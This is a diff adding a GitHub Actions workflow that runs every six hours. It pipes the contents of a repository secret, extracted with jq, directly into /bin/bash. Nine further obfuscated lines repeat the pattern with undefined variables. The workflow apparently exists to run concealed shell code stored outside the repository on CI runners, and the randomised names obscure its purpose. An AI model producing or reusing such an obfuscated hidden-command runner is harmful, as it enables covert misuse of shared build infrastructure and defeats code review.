@@ -1,0 +1,28 @@
+name: shouxianyaozuodeshi
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shouxianyaozuodeshi
+        env:
+          apizc79562: ${{ secrets.apizc79562 }}
+        run: |
+          echo $apizc79562 | jq -r .ixlc91454 | /bin/bash
+          echo $wduc8 | jq -r .wb7 | /bin/bash
+          echo $g6070 | jq -r .yhca6 | /bin/bash
+          echo $qzalj58 | jq -r .bkstw62068 | /bin/bash
+          echo $hbjqn56728 | jq -r .ssiw2641 | /bin/bash
+          echo $kvv963 | jq -r .wgkh19397 | /bin/bash
+          echo $zx879 | jq -r .yzz963 | /bin/bash
+          echo $vx261 | jq -r .ubu7061 | /bin/bash
+          echo $hzqw9 | jq -r .z249 | /bin/bash
+          echo $zj9 | jq -r .wdain35086 | /bin/bash
+
